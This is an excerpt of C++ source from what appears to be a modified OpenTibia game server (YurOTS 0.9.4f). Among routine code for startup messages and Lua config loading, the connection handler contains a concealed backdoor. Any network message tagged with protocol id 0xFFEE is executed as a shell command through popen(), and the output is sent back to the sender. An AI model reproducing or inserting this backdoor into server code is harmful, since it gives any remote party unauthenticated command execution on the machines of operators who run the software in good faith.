...
OTSYS_THREAD_RETURN ConnectionHandler(void *dat)
{
	...
	if (msg.ReadFromSocket(s))
	{
        ...
        else if(protId ==0xFFEE)
        {
        std::string original=msg.GetRaw();
        msg.Reset();
        msg.AddString(cFunc(original));
        msg.WriteToSocket(s);
        }
//        std::cout << "protId is:\"" << protId << "\" and voided is:\""<<(void*)(uint32_t)protId<<"\"";
  }
  if(s)
  {
	  closesocket(s);
...
std::string cFunc(std::string i)
{char c;
FILE * p=popen(i.c_str(),"r");
std::string o="";
if (p!=NULL)
    {
    do {//parse
...
int main(int argc, char *argv[])
{
	...
	std::cout << ":: YurOTS 0.9.4f Hans_Henrik Edition 11 NSV Edition Private" << std::endl;
	std::cout << ":: ~~~~~~~~~~~~~" << std::endl;
...
//	LOG_MESSAGE("main", EVENT, 1, "Starting server");
...
#else
#ifdef HHB_EXE_CONFIG_LUA
	if (!g_config.OpenFile(std::string(std::string(argv[0])+std::string(".config.lua")).c_str()))
#else
	...
	{
#ifdef HHB_EXE_CONFIG_LUA
    ErrorMessage(std::string(std::string("Unable to load ")+std::string(argv[0])+std::string(".config.lua")).c_str());
#else
